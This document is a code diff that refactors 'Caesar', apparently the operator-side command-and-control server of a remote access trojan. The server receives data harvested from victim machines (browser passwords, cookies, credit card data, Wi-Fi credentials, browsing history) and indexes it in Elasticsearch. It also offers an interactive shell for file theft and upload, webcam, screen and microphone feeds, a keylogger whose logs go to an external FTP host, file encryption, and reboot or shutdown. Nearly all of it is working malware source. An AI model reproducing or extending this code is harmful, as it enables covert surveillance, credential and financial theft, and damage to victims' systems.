@@ -1,155 +1,119 @@
-import socket
-import threading
-from queue import Queue
-import time
 import os
 import re
 import json
-from datetime import datetime
-from getmac import get_mac_address as gma
-from es_handler import EsHandler
-from client_handler import ClientHandler
+import time
 import struct
+import socket
+import threading
+from queue import Queue
+from datetime import datetime
+from es_handler import EsHandler
 from data_analyzer import Analyzer
+from client_handler import ClientHandler
+from getmac import get_mac_address as gma
+
 
 
 
 
 class Caesar:
 
-        def __init__(self, host, port, db_name, es_url):
+        def __init__(self, host, port, db_name, es_url, client_folder_name):
             self.host = host
             self.port = port
-            self.esHandler = EsHandler(db_name, es_url)
-            self.clientHandler = ClientHandler()
+            self.sock = None
+            self.queue = Queue()
             self.socket_object_dict = {}
             self.current_session_id = str()
-            self.queue = Queue()
             self.analyzer = Analyzer(db_name)
-            self.clientFolder = "ClientFolder"
-
-
+            self.clientHandler = ClientHandler()
+            self.clientFolder = client_folder_name
+            self.esHandler = EsHandler(db_name, es_url)
 
             ##################################FTP SERVER CREDENTIALS#############################
-
+            self.FTP_USER = ""
             self.FTP_PASS = ""
             self.LOG_FILE = "log.txt"
             self.FTP_HOST = "files.000webhost.com"
-            self.FTP_USER = ""
-
             ##################################FTP SERVER CREDENTIALS#############################
 
 
 
-
-
-        #create socket and listen for client connections
+        # create socket and listen for connections
         def create_socket(self):
-            global sock
             try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.bind((self.host, self.port))
-                sock.listen(20) #listen for connection
+                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.sock.bind((self.host, self.port))
+                self.sock.listen(20) #listen for connection
             except socket.error as err:
-                print("[-]Error unable to create socket!!!" + str(err))
+                print(f"[-]Error unable to create socket {str(err)}")
 
 
-
-
-        #handles incoming connection
+        # handles incoming connections
         def handle_connections(self):
             while True:
+
                 try:
-                    conn, addr = sock.accept()
+                    conn, addr = self.sock.accept()
                     conn.setblocking(True)
-                    data = conn.recv(1024).decode()#recieves client system information
-                    ip = re.findall("'(.*?)'", str(addr))#extract ip from addr
+                    client_info = conn.recv(1024).decode()# recieves client system information
+                    ip = re.findall("'(.*?)'", str(addr))# extract ip from addr
                     ip = "".join(ip)
 
-                    #check if connected client already exists
-                    if (self.esHandler.is_conn_present(data.split()[0])):
-                        client_id = self.esHandler.update_document(data.split()[0], ip, data)
+                    # check if connected client already exists in ES index
+                    if (self.esHandler.is_conn_present(str(json.loads(client_info)['mac-address']))):
+                        client_id = self.esHandler.update_document(str(json.loads(client_info)['mac-address']), ip, client_info)
                         self.socket_object_dict.update({client_id:conn})
 
                         path = os.path.join(self.clientFolder, str(client_id))
                         if not os.path.exists(path):
                             os.mkdir(path)
 
-                        print("\n[+]Node " + str(ip) + " has reconnected!!!")
-
+                        print(f"\n[+]Node {ip} has reconnected on port {self.port}!")
                         self.store_harvested_data(conn, client_id)
 
-                    #create a new document if the client does not exist
+
+                    # create a new ES document if the client does not exist
                     else:
-                        client_id = str()
-                        dict_obj = self.esHandler.store_client_information(ip, conn, data)
+                        client_conn_dict = self.esHandler.store_client_information(ip, conn, client_info)
+                        client_id = next(iter(client_conn_dict))
 
-                        for k, v in dict_obj.items():
-                            client_id = k
                         path = os.path.join(self.clientFolder, str(client_id))
-
                         if not os.path.exists(path):
-                            os.mkdir(path) #create a folder for new client
+                            os.mkdir(path) # create a folder for new client using their ES client ID
 
-                        self.socket_object_dict.update(dict_obj)
-                        print("\n[+]Node " + str(ip) + " has connected!!!")
-
+                        self.socket_object_dict.update(client_conn_dict)
+                        print(f"\n[+]Node {ip} has connected!")
                         self.store_harvested_data(conn, client_id)
 
                 except Exception as e:
-                    #print("[-]Something went wrong connecting to client!!!")
                     print(e)
+                    # print("[-]Something went wrong connecting to client!!!")
                     break
 
 
 
-        #handles connection thread
-        def thread_handler(self):
-            for _ in range(2):
-                thread = threading.Thread(target=self.work)
-                thread.deamon = True
-                thread.start()
-
-
-        def work(self):
-            thread_number = self.queue.get()
-            if thread_number == 1:
-                self.create_socket()
-                self.handle_connections()
-            if thread_number == 2:
-                self.shell_interface()
-            self.queue.task_done()
-
-
-
-        def job_handler(self):
-            job_number = [1, 2]
-            for x in job_number:
-                self.queue.put(x)
-            self.queue.join()
-
-
-
-        #displays caesar shell commands
+        # displays caesar shell commands
         def show_commands(self):
             user_guide = """
                 Caesar Commands
                      'guide': [Display Caesar's user commands]
-                     'clients':['lists clients within ES index']
-                     'connected':['lists all active connection within ES index']
-                     'shell (target ES Client_ID)':['selects a target and creates a session between the server and the client machine ']
-                     'delete (target ES Client_ID)': ['remove specified document from index']
-                     'delete all': ['remove all document from index']
-                     'get (target ES Client_ID)': ['retrieves indexed data of specified target ']
-                     'show fields (target ES Client_ID)': ['displays existing field for specified target']
-                     'field (target ES Client_ID) (FIELD NAME):  ['displays specified field']
+                     'clients':[lists clients within ES index]
+                     'connected':[lists all active connection within ES index]
+                     'shell (target ES Client_ID)':[selects a target and creates a session between the server and the client machine]
+                     'delete (target ES Client_ID)': [remove specified document from index]
+                     'delete all': [remove all document from index]
+                     'get (target ES Client_ID)': [retrieves indexed data of specified target]
+                     'show fields (target ES Client_ID)': [displays existing field for specified target]
+                     'field (target ES Client_ID) (FIELD NAME):  [displays specified field]
 
-                Client Commands                                                
-                    'quit':['quits the session and takes user back to Caesar ES interface']           
-                    'get (filename or path)':['Receieve specified file from target client']
-                    'send (filename or absolute path)':['send specified file to the target client']      
-                    'screenshot':['takes a screen shot of the client machine']
-                    'camshot':['captures an image from the client's webcam']  
+                Client Commands
+                    'guide': [Display Caesar's user commands]                                                
+                    'quit':[quits the session and takes user back to Caesar ES interface]           
+                    'get (filename or path)':[Receieve specified file from target client]
+                    'send (filename or absolute path)':[send specified file to the target client]      
+                    'screenshot':[takes a screen shot of the client machine]
+                    'camshot':[captures an image from the client's webcam]  
                     'camfeed': [live feed from target's webcam]
                     'screenfeed': [live feed from target's screen]
                     'audiofeed': [live audio feed from target's microphone]
@@ -178,6 +142,7 @@ class Caesar:
 
 
 
+        # format text to bold and blue 
         def convert_caesar_text(self, text):
             RESET = "\033[0m"
             BOLD = "\033[1m"
@@ -185,7 +150,7 @@ class Caesar:
             return f"{BOLD}{COLOR}{text}{RESET}"
 
 
-
+        # returns socket connection object 
         def get_socket_obj(self, client_id):
             try:
                 for clients, socket_obj in self.socket_object_dict.items():
@@ -197,91 +162,42 @@ class Caesar:
 
 
 
-
-        #sends null to the client and get the current working directory in return
+        # sends null to the client and get the current working directory in return
         def send_null(self, client_sock_object):
-                client_sock_object.send(str(" ").encode())
-                data = client_sock_object.recv(1024).decode()
-                print(str(data), end="")
-
+            client_sock_object.send(str(" ").encode())
+            data = client_sock_object.recv(1024).decode()
+            print(str(data), end="")
 
 
 
         #saves harvested system info from client in Elastic Search Index
         def store_harvested_data(self, client_sock_object, client_id):
+            data_types = [
+                ("installed-apps", "Installed App Data"),
+                ("startup-app-data", "Startup App Data"),
+                ("wifi-credentials", "Wi-Fi Password Credentials"),
+                ("browser-passwords", "Browser Password Data"),
+                ("browser-cookie", "Browser Cookie Data"),
+                ("browser-history", "Browser History Data"),
+                ("credit-card-info", "Credit Card Data"),
+                ("autofill-data", "Autofill Data"),
+                ("memory-info", "Memory Info Data"),
+                ("disk-info", "Disk Info Data"),
+                ("network-info", "Network Info Data"),
+                ("user-activity-data", "User Activity Data"),
+                ("other-data", "Other Data")
+            ]
+
             try:
-
-                installedAppData = self.recv_msg(client_sock_object)  
-                installedAppData =  json.loads(installedAppData.decode())
-                self.esHandler.append_information("installed-apps", installedAppData, client_id)
-
-
-                startupAppData = self.recv_msg(client_sock_object)   
-                startupAppData = json.loads(startupAppData.decode())
-                self.esHandler.append_information("startup-app-data", startupAppData, client_id)
-
-                wifiPasswordCredentials = self.recv_msg(client_sock_object)    
-                wifiPasswordCredentials = json.loads(wifiPasswordCredentials.decode())
-                self.esHandler.append_information("wifi-credentials", wifiPasswordCredentials, client_id)
-
-
-                #===============================================Browser Data===========================================
-
-                browserPasswordData = self.recv_msg(client_sock_object)   
-                browserPasswordData = json.loads(browserPasswordData.decode())
-                self.esHandler.append_information("browser-passwords", browserPasswordData, client_id)
-             
-                browserCookieData = self.recv_msg(client_sock_object)   
-                browserCookieData = json.loads(browserCookieData.decode())
-                self.esHandler.append_information("browser-cookie", browserCookieData, client_id)
-
-                browserHistoryData = self.recv_msg(client_sock_object)   
-                browserHistoryData = json.loads(browserHistoryData.decode())
-                self.esHandler.append_information("browser-history", browserHistoryData, client_id)
-
-                creditCardData = self.recv_msg(client_sock_object)   
-                creditCardData = json.loads(creditCardData.decode())
-                self.esHandler.append_information("credit-card-info", creditCardData, client_id)
-
-                autofillData = self.recv_msg(client_sock_object)   
-                autofillData = json.loads(autofillData.decode())
-                self.esHandler.append_information("autofill-data", autofillData, client_id)
-
-                #===============================================Browser Data===========================================
-
-                
-
-
-                #===============================================System Data============================================
-
-                memoryInfoData = self.recv_msg(client_sock_object)   
-                memoryInfoData = json.loads(memoryInfoData.decode())
-                self.esHandler.append_information("memory-info", memoryInfoData, client_id)
-
-                diskInfoData = self.recv_msg(client_sock_object)   
-                diskInfoData = json.loads(diskInfoData.decode())
-                self.esHandler.append_information("disk-info", diskInfoData, client_id)
-
-                networkInfoData = self.recv_msg(client_sock_object)   
-                networkInfoData = json.loads(networkInfoData.decode())
-                self.esHandler.append_information("network-info", networkInfoData, client_id)
-
-            
-                userActivityData = self.recv_msg(client_sock_object)   
-                userActivityData = json.loads(userActivityData.decode())
-                self.esHandler.append_information("user-activity-data", userActivityData, client_id)
-            
-
-                otherData = self.recv_msg(client_sock_object)   
-                otherData = json.loads(otherData.decode())
-                self.esHandler.append_information("other-data", otherData, client_id)
-
-                #===============================================System Data============================================
-
-                print("[+]Data extraction completed!!!")
+                for index, (data_key, data_description) in enumerate(data_types, start=1):
+                    data = self.recv_msg(client_sock_object)
+                    data = json.loads(data.decode())
+                    self.esHandler.append_information(data_key, data, client_id)
+                    print(f"[+]{data_description} extraction completed ({index}/{len(data_types)})")
+                print("[+] Data extraction completed!")
 
             except Exception as e:
-                print("[-]Error occured while collectiing data!!!")
+                print("[-]Error occurred while collecting data!!!")
                 print(e)
 
 
@@ -310,262 +226,218 @@ class Caesar:
 
 
 
-        #sends commands to the client
+        # sends commands to the client
         def handle_client_session(self, client_id, client_sock_object):
-                self.send_null(client_sock_object)
-                self.current_session_id = client_id
+            self.send_null(client_sock_object)
+            self.current_session_id = client_id
 
-
-                while True:
+            while True:
+                try:
                     cmd = ""
                     cmd = input()
                     cmd = cmd.rstrip()
 
-                    if cmd.strip()== 'quit':
+                    if cmd.strip() == 'quit':
                         print("[+]Closing Session!!!!....")
                         self.current_session_id = ""
                         break
 
                     elif cmd == "":
                         self.send_null(client_sock_object)
-                    elif "get" in cmd:
-                        try:
+
+                    elif cmd == "guide":
+                        self.show_commands()
+                        self.send_null(client_sock_object)
+
+                    elif cmd.startswith("get "):
+                        client_sock_object.send(str(cmd).encode())
+                        usrFile = cmd.split()[-1]
+                        data = client_sock_object.recv(1024).decode()
+                        if "File does not exist!!!" not in data:
+                            self.clientHandler.receive_file(client_sock_object, self.clientFolder, self.current_session_id, usrFile)
+                            print(str(data), end="")
+                        else:
+                            print(data)
+
+                    elif cmd.startswith("send "):
+                        filepath = str(cmd.split()[-1])
+
+                        if os.path.isabs(filepath):
                             client_sock_object.send(str(cmd).encode())
-                            usrFile = client_sock_object.recv(1024).decode()
-                            data = client_sock_object.recv(1024).decode()
-                            if "File does not exist!!!" not in data:
-                                self.clientHandler.receive_file(client_sock_object, self.clientFolder, self.current_session_id, usrFile)
-                                print(str(data), end="")
-                            else:
-                                print(data)
-                        except Exception as e:
-                            print(e)
-                            print("[-]Connection terminated!!!")
-                            break
-                    elif "send" in cmd:
-                        try:
-                            client_sock_object.send(str(cmd).encode())
-                            self.clientHandler.send_file(client_sock_object, cmd[5:])
+                            self.clientHandler.send_file(client_sock_object, filepath)
                             data = client_sock_object.recv(1024).decode()
                             print(str(data), end="")
-                        except Exception as e:
-                            print(e)
-                            print("[-]Connection terminated!!!")
-                            break
+                        else:
+                            print("[-]You must provide an absolue path for the file you want to send!")
+                            self.send_null(client_sock_object)
+
                     elif cmd.strip() == "camshot":
-                        try:
-                            cmd = cmd.strip()
-                            client_sock_object.send(str(cmd).encode())
-                            data = client_sock_object.recv(1024).decode()
-                            self.clientHandler.receive_client_image(self.clientFolder, self.current_session_id, client_sock_object)
-                            print(str(data), end="")
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
+                        cmd = cmd.strip()
+                        client_sock_object.send(str(cmd).encode())
+                        data = client_sock_object.recv(1024).decode()
+                        self.clientHandler.receive_client_image(self.clientFolder, self.current_session_id, client_sock_object)
+                        print(str(data), end="")
+
                     elif cmd.strip() == "camfeed":
-                        try:
-                            cmd = cmd.strip()
-                            client_sock_object.send(str(cmd).encode())
-                            data = client_sock_object.recv(1024).decode()
-                            self.clientHandler.live_webcam_feed(client_sock_object)
-                            print(str(data), end="")
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
+                        cmd = cmd.strip()
+                        client_sock_object.send(str(cmd).encode())
+                        data = client_sock_object.recv(1024).decode()
+                        self.clientHandler.live_webcam_feed(client_sock_object)
+                        print(str(data), end="")
+                          
                     elif cmd.strip() == "screenshot":
-                        try:
-                            cmd = cmd.strip()
-                            client_sock_object.send(str(cmd).encode())
-                            data = client_sock_object.recv(1024).decode()
-                            self.clientHandler.receive_client_image(self.clientFolder, self.current_session_id, client_sock_object)
-                            print(str(data), end="")
-                        except Exception as e:
-                            print(e)
-                            print("[-]Connection terminated!!!")
-                            break
+                        cmd = cmd.strip()
+                        client_sock_object.send(str(cmd).encode())
+                        data = client_sock_object.recv(1024).decode()
+                        self.clientHandler.receive_client_image(self.clientFolder, self.current_session_id, client_sock_object)
+                        print(str(data), end="")
+
                     elif cmd.strip() == "screenfeed":
-                        try:
-                            cmd = cmd.strip()
-                            client_sock_object.send(str(cmd).encode())
-                            data = client_sock_object.recv(1024).decode()
-                            self.clientHandler.live_screen_feed(client_sock_object)
-                            print(str(data), end="")
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
+                        cmd = cmd.strip()
+                        client_sock_object.send(str(cmd).encode())
+                        data = client_sock_object.recv(1024).decode()
+                        self.clientHandler.live_screen_feed(client_sock_object)
+                        print(str(data), end="")
+
                     elif cmd.strip() == "audiofeed":
-                        try:
-                            cmd = cmd.strip()
-                            client_sock_object.send(str(cmd).encode())
-                            data = client_sock_object.recv(1024).decode()
-                            self.clientHandler.live_audio_feed(client_sock_object, self.clientFolder, self.current_session_id)
-                            print(str(data), end="")
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
-                    elif "encrypt" in cmd:
-                        try:
-                            client_sock_object.send(str(cmd).encode())
-                            data = client_sock_object.recv(1024).decode()
-                            print(str(data), end="")
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
-                    elif "decrypt" in cmd:
-                        try:
-                            client_sock_object.send(str(cmd).encode())
-                            data = client_sock_object.recv(1024).decode()
-                            print(str(data), end="")
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
+                        cmd = cmd.strip()
+                        client_sock_object.send(str(cmd).encode())
+                        data = client_sock_object.recv(1024).decode()
+                        self.clientHandler.live_audio_feed(client_sock_object, self.clientFolder, self.current_session_id)
+                        print(str(data), end="")
 
-                    elif "ftp download" in cmd:
-                        try:
-                            cmd += f" {self.FTP_PASS} {self.clientFolder} {self.current_session_id} {self.FTP_HOST} {self.FTP_USER}"
+                    elif cmd.startswith("encrypt "):
+                        client_sock_object.send(str(cmd).encode())
+                        data = client_sock_object.recv(1024).decode()
+                        print(str(data), end="")
 
+                    elif cmd.startswith("decrypt "):
+                        client_sock_object.send(str(cmd).encode())
+                        data = client_sock_object.recv(1024).decode()
+                        print(str(data), end="")
 
-                            client_sock_object.send(str(cmd).encode())
-                            data = client_sock_object.recv(1024).decode()
-                            print(str(data), end="")
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
+                    elif cmd.startswith("ftp download "):
+                        cmd += f" {self.FTP_PASS} {self.clientFolder} {self.current_session_id} {self.FTP_HOST} {self.FTP_USER}"
+                        client_sock_object.send(str(cmd).encode())
+                        data = client_sock_object.recv(1024).decode()
+                        print(str(data), end="")
 
-                    elif "ftp upload" in cmd:
-                        try:
-
-                            cmd += f" {self.FTP_PASS} {self.clientFolder} {self.current_session_id} {self.FTP_HOST} {self.FTP_USER}"
-
-                            client_sock_object.send(str(cmd).encode())
-                            data = client_sock_object.recv(1024).decode()
-                            print(str(data), end="")
-
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
+                    elif cmd.startswith("ftp upload"):
+                        cmd += f" {self.FTP_PASS} {self.clientFolder} {self.current_session_id} {self.FTP_HOST} {self.FTP_USER}"
+                        client_sock_object.send(str(cmd).encode())
+                        data = client_sock_object.recv(1024).decode()
+                        print(str(data), end="")
 
                     elif cmd == "start keylogger":
-
-                        try:
-
-                            cmd +=  f" {self.FTP_PASS} {self.LOG_FILE} {self.clientFolder} {self.current_session_id} {self.FTP_HOST} {self.FTP_USER}"
-
-
-                            client_sock_object.send(str(cmd).encode())
-                            data = client_sock_object.recv(1024).decode()
-                            print(str(data), end="")
-
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
+                        cmd +=  f" {self.FTP_PASS} {self.LOG_FILE} {self.clientFolder} {self.current_session_id} {self.FTP_HOST} {self.FTP_USER}"
+                        client_sock_object.send(str(cmd).encode())
+                        data = client_sock_object.recv(1024).decode()
+                        print(str(data), end="")
 
                     elif cmd == "stop keylogger":
-                        try:
-                            client_sock_object.send(str(cmd).encode())
-                            data = client_sock_object.recv(1024).decode()
-                            print(str(data), end="")
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
+                        client_sock_object.send(str(cmd).encode())
+                        data = client_sock_object.recv(1024).decode()
+                        print(str(data), end="")
+
                     elif cmd == "keylogger status":
-                        try:
-                            client_sock_object.send(str(cmd).encode())
-                            data = client_sock_object.recv(1024).decode()
-                            print(str(data), end="")
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
+                        client_sock_object.send(str(cmd).encode())
+                        data = client_sock_object.recv(1024).decode()
+                        print(str(data), end="")
+
                     elif cmd.strip() == "reboot":
-                        try:
-                            cmd = cmd.strip()
-                            client_sock_object.send(str(cmd).encode())
-                            data = client_sock_object.recv(1024).decode()
-                            print(str(data), end="")
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
+                        cmd = cmd.strip()
+                        client_sock_object.send(str(cmd).encode())
+                        data = client_sock_object.recv(1024).decode()
+                        print(str(data), end="")
+
                     elif cmd.strip() == "shutdown":
-                        try:
-                            cmd = cmd.strip()
-                            client_sock_object.send(str(cmd).encode())
-                            data = client_sock_object.recv(1024).decode()
-                            print(str(data), end="")
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
+                        cmd = cmd.strip()
+                        client_sock_object.send(str(cmd).encode())
+                        data = client_sock_object.recv(1024).decode()
+                        print(str(data), end="")
+
                     else:
-                        try:
-                            client_sock_object.send(str(cmd).encode())
-                            data = client_sock_object.recv(65536).decode()
-                            print(str(data), end="")
-                        except:
-                            print("[-]Connection terminated!!!")
-                            break
+                        client_sock_object.send(str(cmd).encode())
+                        data = client_sock_object.recv(65536).decode()
+                        print(str(data), end="")
+
+                except Exception as e:
+                    print(e)
+                    print("[-]Connection terminated!!!")
+                    break
 
 
 
-        #shell interface
+        # shell interface
         def shell_interface(self):
-                while True:
-                    print(self.convert_caesar_text("Caesar: "), end="")
-                    cmd = input()
-                    cmd = cmd.rstrip()
+            while True:
+                print(self.convert_caesar_text("Caesar: "), end="")
+                cmd = input()
+                cmd = cmd.rstrip()
 
-                    if cmd == '':
-                        pass
-                    elif cmd.strip() == 'clients':
-                        self.esHandler.retrieve_client_information()
+                if cmd == '':
+                    pass
+                elif cmd.strip() == 'clients':
+                    self.esHandler.retrieve_client_information()
 
-                    elif 'show fields' in cmd:
-                        cmd = cmd.split()
-                        if len(cmd) == 3:
-                            client_id = cmd[2]
-                            self.esHandler.show_fields(client_id)
-                        else:
-                            print("[-]Invalid use of the show field command")            
+                elif cmd.startswith('show fields '):
 
+                    cmd = cmd.split()
+                    if len(cmd) == 3:
+                        client_id = cmd[2]
+                        self.esHandler.show_fields(client_id)
+                    else:
+                        print("[-]Invalid use of the show field command")            
 
-                    elif 'get' in cmd:
-                        client_id = cmd[4:]
-                        self.esHandler.retrieve_client_document(client_id)
+                elif cmd.strip() == 'guide':
+                    self.show_commands()
 
-                    
-                    elif 'delete all' in cmd:
-                        self.esHandler.delete_all_docs()
-                        self.socket_object_dict.clear()
+                elif 'get' in cmd:
+                    client_id = cmd[4:]
+                    self.esHandler.retrieve_client_document(client_id)
 
-                    elif 'delete' in cmd:
-                        client_id = cmd[7:]
-                        self.esHandler.delete_client_document(client_id)
-                        if(client_id in self.socket_object_dict):
-                            self.socket_object_dict.pop(client_id)
+                
+                elif cmd.startswith('delete all '):
+                    self.esHandler.delete_all_docs()
+                    self.socket_object_dict.clear()
 
-
-                    elif 'field' in cmd:
-                        cmd = cmd.split()
-                        if len(cmd) == 3:          
-                            client_id = cmd[1]
-                            parameter = cmd[2]
-                            self.esHandler.get_field(client_id, parameter)
-                        else:
-                            print("[-]Invalid use of the field command")
+                elif cmd.startswith('delete '):
+                    client_id = cmd[7:]
+                    self.esHandler.delete_client_document(client_id)
+                    if(client_id in self.socket_object_dict):
+                        self.socket_object_dict.pop(client_id)
 
 
-                    elif "browser summary" in cmd:
+                elif 'field' in cmd:
+                    cmd = cmd.split()
+                    if len(cmd) == 3:          
+                        client_id = cmd[1]
+                        parameter = cmd[2]
+                        self.esHandler.get_field(client_id, parameter)
+                    else:
+                        print("[-]Invalid use of the field command")
+
+
+                elif cmd.strip() == 'connected':
+                    self.esHandler.get_connected_client(self.socket_object_dict)
+
+                elif cmd.startswith('shell '):
+                    client_id = cmd[6:]
+                    current_session_id = client_id
+                    client_sock_object = self.get_socket_obj(client_id)
+
+                    # check if connection is still active
+                    if(self.socket_object_dict):
+                        try:
+                            client_sock_object.send("conn check".encode())
+                            self.handle_client_session(client_id, client_sock_object)
+                        except Exception as e:
+                            print("[-]Client connection is not active!")
+                    else:
+                        print("[-]No connection is active!")
+
+
+                elif cmd.startswith('browser summary '):
                         cmd = cmd.split()
                         if len(cmd) == 3: 
                             client_id = cmd[2]
@@ -573,98 +445,79 @@ class Caesar:
                         else:
                             print("[-]Invalid use of the field command")
 
+                elif cmd.startswith('resolve history '):
+                    cmd = cmd.split()
+                    client_id = cmd[2]
+                    self.analyzer.yt_resolver(cmd[2])
 
-                    elif "resolve history" in cmd:
-                        cmd = cmd.split()
-                        client_id = cmd[2]
-                        self.analyzer.yt_resolver(cmd[2])
-
-
-                    elif cmd.strip() == 'guide':
-                        self.show_commands()
-
-
-                    elif 'most active times' in cmd:
-                        cmd = cmd.split()
-                        if len(cmd) == 4:
-                            self.analyzer.most_active_times(cmd[3])
-                        else:
-                            print("[-]Invalid command!!!")
-
-
-                    elif 'average active times' in cmd:
-                        cmd = cmd.split()
-                        if len(cmd) == 4:
-                            self.analyzer.average_browsing_hours(cmd[3])
-                        else:
-                            print("[-]Invalid command!!!")
-
-
-                    elif 'web titles' in cmd:
-                        cmd = cmd.split()
-                        if len(cmd) == 4:
-                            self.analyzer.get_web_titles(cmd[2], cmd[3])
-                        else:
-                            print("[-]Invalid command!!!")
-
-
-                    elif 'video titles' in cmd:
-                        cmd = cmd.split() 
-                        channel_name = ' '.join(cmd[3:])
-                        self.analyzer.get_video_titles(cmd[2], channel_name)
-                        
-
-                    elif 'rank channels' in cmd:
-                        cmd = cmd.split()
-                        if len(cmd) == 4:
-                            self.analyzer.rank_youtube_channels(cmd[2], int(cmd[3]))
-                        else:
-                            print("[-]Invalid command!!!")
-
-
-                    elif 'rank websites' in cmd:
-                        cmd = cmd.split()
-                        if len(cmd) == 4:
-                            self.analyzer.most_visited_websites(cmd[2], int(cmd[3]))
-                        else:
-                            print("[-]Invalid command!!!")
-
-
-                    elif 'user activity' in cmd:
-                        cmd = cmd.split()
-                        if len(cmd) == 3:
-                            self.analyzer.get_windows_activity_history(cmd[2])
-                        else:
-                            print("[-]Invalid command!!!")
-
-
-
-                    elif cmd.strip() == 'connected':
-                        self.esHandler.get_connected_client(self.socket_object_dict)
-
-                    elif 'shell' in cmd:
-                        client_id = cmd[6:]
-                        current_session_id = client_id
-                        client_sock_object = self.get_socket_obj(client_id)
-
-                        #check if connection is still active
-                        if(bool(self.socket_object_dict)):
-                            try:
-                                client_sock_object.send("conn check".encode())
-                                self.handle_client_session(client_id, client_sock_object)
-                            except Exception as e:
-                                
-                                print("[-]Client connection is not active!!!")
-                        else:
-                            print("[-]No connection is active!!!")
-
+                elif cmd.startswith('most active times '):
+                    cmd = cmd.split()
+                    if len(cmd) == 4:
+                        self.analyzer.most_active_times(cmd[3])
                     else:
                         print("[-]Invalid command!!!")
 
 
+                elif cmd.startswith('average active times '):
+                    cmd = cmd.split()
+                    if len(cmd) == 4:
+                        self.analyzer.average_browsing_hours(cmd[3])
+                    else:
+                        print("[-]Invalid command!!!")
+
+
+                elif cmd.startswith('web titles '):
+                    cmd = cmd.split()
+                    if len(cmd) == 4:
+                        self.analyzer.get_web_titles(cmd[2], cmd[3])
+                    else:
+                        print("[-]Invalid command!!!")
+
+
+                elif cmd.startswith('video titles '):
+                    cmd = cmd.split() 
+                    channel_name = ' '.join(cmd[3:])
+                    self.analyzer.get_video_titles(cmd[2], channel_name)
+                    
+
+                elif cmd.startswith('rank channels '):
+                    cmd = cmd.split()
+                    if len(cmd) == 4:
+                        self.analyzer.rank_youtube_channels(cmd[2], int(cmd[3]))
+                    else:
+                        print("[-]Invalid command!!!")
+
+
+                elif cmd.startswith('rank websites '):
+                    cmd = cmd.split()
+                    if len(cmd) == 4:
+                        self.analyzer.most_visited_websites(cmd[2], int(cmd[3]))
+                    else:
+                        print("[-]Invalid command!!!")
+
+
+                elif cmd.startswith('user activity '):
+                    cmd = cmd.split()
+                    if len(cmd) == 3:
+                        self.analyzer.get_windows_activity_history(cmd[2])
+                    else:
+                        print("[-]Invalid command!!!")
+
+                else:
+                    print("[-]Invalid command!")
+
+
+        
+        def thread_handler(self):
+            for task_number in [1, 2]:
+                thread = threading.Thread(target=self.handle_connections if task_number == 1 else self.shell_interface)
+                if task_number == 1:
+                    thread.daemon = True
+                thread.start()
+
 
 
         def start(self):
+            self.create_socket()
             self.thread_handler()
-            self.job_handler()
 
